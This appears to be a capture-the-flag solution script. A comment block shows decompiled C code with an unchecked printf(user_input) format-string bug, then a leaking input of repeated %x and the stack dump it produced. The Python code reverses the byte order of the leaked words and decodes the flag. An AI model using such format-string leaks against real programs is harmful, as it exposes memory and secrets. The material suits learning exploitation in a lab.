'''
Random + Format String

    __format = (char *)malloc(0x171);
    __stream = fopen("flag.txt","r");
    if (__stream == (FILE *)0x0) {
      printf("%s[-] Could not open flag.txt. Please contact the creator.\n",&DAT_00011548,puVar5 );
                    /* WARNING: Subroutine does not return */
      exit(0x69);
    }
    fgets(local_3c,0x2c,__stream);
    read(0,__format,0x170);
    puts(
        "\n\x1b[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world  to know this: \x1b[0m"
        );
    printf(__format);

After several round of try...

Input:
"%x.%x....%x"
Result:
"5830c1c0.170.5664ddfa.1e.0.26.2.1.5664e96c.5830c1c0.5830c340.7b425448.5f796877.5f643164.34735f31.745f3376.665f3368.5f67346c.745f6e30.355f3368.6b633474.7d213f.63a9c900.f7ee43fc.56650f8c.ffc75858.5664e441.1.ffc75904.ffc7590c.63a9c900.ffc75870.0.0.f7d27f21.f7ee4000.f7ee4000.0.f7d27f21.1.ffc75904.ffc7590c.ffc75894.1.ffc75904.f7ee4000.f7f0270a.ffc75900.0.f7ee4000.0.0.872ca40e.ad61821e.0.0.0.40.f7f1a024.0.0.f7f02819.56650f8c.1.5664d790.0.5664d7c1.5664e3e1.1.ffc75904.5664e490.5664e4f0.f7f02960.ffc758fc.f7f1a940.1.ffc75d3b.0.ffc75d4d.ffc75d6f.ffc75d9c.ffc75dbb.ffc75dde.ffc75e0b.ffc75e20.ffc75e3c.ffc75e5a.ffc75e76.ffc75e9e.ffc75ee0.ffc75f05.ffc75f26.ffc75f31.ffc75f53.ffc75f60.ffc75f6d.ffc75f83.ffc75f9f.ffc75fb3.ffc75fd1.0.20.f7ef1550.21.f7ef1000.10.178bfbff.6."

'''

f = '7b4254485f7968775f64316434735f31745f3376665f33685f67346c745f6e30355f33686b633474007d213f'
flag = ''
for i in range(0,len(f),8):
	flag += f[i+6:i+8]+f[i+4:i+6]+f[i+2:i+4]+f[i:i+2]
	#print flag
print flag.decode('hex')
